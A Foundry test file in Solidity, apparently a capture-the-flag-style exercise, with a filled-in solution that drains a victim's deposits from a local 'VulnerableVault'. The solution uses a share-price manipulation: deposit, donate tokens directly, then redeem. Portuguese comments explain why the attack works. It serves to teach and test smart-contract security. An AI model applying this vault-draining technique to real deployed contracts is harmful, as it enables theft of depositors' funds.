// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MCK") {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }
}

contract VaultExploit is Test {
    VulnerableVault public vault;
    MockERC20 public token;
    address public player;
    address public victim;

    function setUp() public {
        token = new MockERC20();
        vault = new VulnerableVault(IERC20(address(token)));

        player = makeAddr("player");
        victim = makeAddr("victim");

        // Give some tokens to the player and victim
        token.transfer(player, 1000 * 10 ** token.decimals());
        token.transfer(victim, 10000 * 10 ** token.decimals());

        // Victim deposits into the vault
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10000 * 10 ** token.decimals(), victim);
        vm.stopPrank();

        console2.log("\n=== Estado Inicial ===");
        console2.log("Saldo da vitima em shares:", vault.balanceOf(victim) / 1e18);
        console2.log("Total Assets no Vault:", vault.totalAssets() / 1e18);
        console2.log("Preco por share:", vault.totalAssets() * 1e18 / vault.totalSupply());
    }

    function testExploit() public {
        vm.startPrank(player);

        // TODO: Exploit the vault here
        // Hint: The vulnerability is in the deposit and withdraw functions
        // Your goal is to drain the victim's funds from the vault

        token.approve(address(vault), type(uint256).max);
        vault.deposit(100 * 10 ** token.decimals(), player);

        // 2. Attacker "doa" tokens diretamente para o vault
        token.transfer(address(vault), 900 * 10 ** token.decimals());

        vm.stopPrank();

        // Mostra estado atual do vault
        console2.log("\n=== Apos doacao do attacker ===");
        console2.log("Total Assets:", vault.totalAssets() / 1e18);
        console2.log("Total Supply de Shares:", vault.totalSupply() / 1e18);
        console2.log("Preco por share:", vault.totalAssets() * 1e18 / vault.totalSupply());

        // 4. Demonstra que o attacker pode retirar mais do que depositou
        vm.startPrank(player);
        uint256 attackerShares = vault.balanceOf(player);
        uint256 assetsToReceive = vault.redeem(attackerShares, player, player);
        vm.stopPrank();

        // // 4. Vítima tenta resgatar suas shares
        vm.startPrank(victim);
        uint256 victimShares = vault.balanceOf(victim);

        // Esta chamada vai falhar com "insufficient balance"
        vm.expectRevert();
        vault.redeem(victimShares, victim, victim);
        vm.stopPrank();

        console2.log("\n=== Resultado Final ===");
        console2.log("\nPlayer:");
        console2.log("- Depositou: 100 tokens");
        console2.log("- Doou: 900 tokens");
        console2.log("- Resgatou:", assetsToReceive / 1e18, "tokens");
        console2.log("- Lucro:", (assetsToReceive - 1000 ether) / 1e18, "tokens");
        console2.log("\nVitima:");
        console2.log("- Depositou:", victimShares / 1e18, "tokens");
        console2.log("- Saldo do protocolo:", token.balanceOf(address(vault)) / 1e18);
        // console2.log("- Resgatou:", victimAssets / 1e18, "tokens");
        // console2.log("- Prejuizo:", (10000 * 10 ** token.decimals() - victimAssets) / 1e18, "tokens");

        // Check if the exploit was successful
        assertGt(token.balanceOf(player), 10000 * 10 ** token.decimals(), "Player should have more than 10000 tokens");
        assertLt(
            token.balanceOf(address(vault)),
            1000 * 10 ** token.decimals(),
            "Vault should have less than 1000 tokens left"
        );
    }

    // O ataque é efetivo porque :
    // A "doação" aumenta o valor de cada share (totalAssets/totalSupply)
    // O atacante pode resgatar suas shares por um valor maior do que depositou
    // A vítima acaba perdendo parte de seus tokens para o atacante, e ao tentar resgatar, o protocolo já não tem tokens o suficiente
    // A vulnerabilidade permite que o atacante manipule o preço das shares através da doação direta de tokens, efetivamente diluindo o valor das shares dos outros depositantes.
}
